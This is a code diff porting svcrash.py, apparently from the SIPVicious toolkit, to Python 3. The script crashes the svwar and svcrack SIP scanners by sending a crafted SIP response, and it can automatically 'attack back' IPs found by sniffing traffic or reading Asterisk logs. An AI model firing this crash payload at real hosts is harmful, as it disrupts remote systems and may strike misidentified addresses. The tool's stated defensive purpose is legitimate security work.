@@ -1,11 +1,11 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # svcrash.py - SIPvicious crash breaks svwar and svcrack
 
 __GPL__ = """
 
    Sipvicious crash exploits a bug in svwar/svcrack.py to stop unauthorized
    scans from flooding the network.
-   Copyright (C) 2012  Sandro Gauci <sandro@enablesecurity.com>
+   Copyright (C) 2008-2020  Sandro Gauci <sandro@enablesecurity.com>
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
@@ -21,34 +21,24 @@ __GPL__ = """
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
 
+import re
+import sys
+import time
 import logging
 import optparse
 import os.path
 import random
-import re
 import select
 import socket
-import sys
-import time
 import warnings
-
-from libs.svhelper import __author__, __version__
-
-__prog__ = 'svcrash'
-warnings.filterwarnings("ignore")
+from scapy.layers.inet import IP, UDP
+from scapy.all import send, Raw, sniff
+from .libs.svhelper import __author__, __version__
 
 scapyversion = 0
-try:
-    from scapy.all import *
-    scapyversion = 2
-except ImportError:
-    pass
-try:
-    from scapy import *
-    scapyversion = 1
-except ImportError:
-    pass
+warnings.filterwarnings("ignore")
 
+__prog__ = 'svcrash'
 
 def getArgs():
     parser = optparse.OptionParser(
@@ -89,10 +79,11 @@ def getArgs():
 class asteriskreadlognsend:
 
     def __init__(self, logfn):
+        self.log = None
         self.logfn = logfn
         self.lastsent = 30
         self.matchcount = 0
-        self.log = None
+        self.origlogsize = 0
 
     def checkfile(self):
         if (self.log is None) or (self.origlogsize > os.path.getsize(self.logfn)):
@@ -124,7 +115,7 @@ class asteriskreadlognsend:
             while 1:
                 ipaddr = self.findfailures()
                 if ipaddr:
-                    for i in xrange(5060, 5080):
+                    for i in range(5060, 5080):
                         if scapyversion > 0:
                             sendattack2(ipaddr, i)
                         else:
@@ -172,7 +163,7 @@ class sniffnsend:
             sniff(prn=self.checknsend, filter="udp port %s" %
                   self.port, store=0)
         except KeyboardInterrupt:
-            print "goodbye"
+            print("goodbye")
 
 crashmsg = 'SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 8.7.6.5:5061;bran'
 crashmsg += 'ch=z9hG4bK-573841574;rport\r\n\r\nContent-length: 0\r\nFrom: '
@@ -185,7 +176,7 @@ def sendattack(ipaddr, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.bind(('0.0.0.0', 5060))
     dst = ipaddr, port
-    s.sendto(crashmsg, dst)
+    s.sendto(bytes(crashmsg, 'utf-8'), dst)
     sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr, port))
     s.close()
 
@@ -197,7 +188,7 @@ def sendattack2(ipaddr, port):
 
 
 def main():
-    options, args = getArgs()
+    options, _ = getArgs()
     if options.auto:
         sns = sniffnsend()
         sns.start()
@@ -205,7 +196,7 @@ def main():
         ast = asteriskreadlognsend(options.astlog)
         ast.start()
     elif options.bruteforceport:
-        for port in xrange(5060, 5090):
+        for port in range(5060, 5090):
             sendattack(options.ipaddr, port)
     else:
         sendattack(options.ipaddr, options.port)
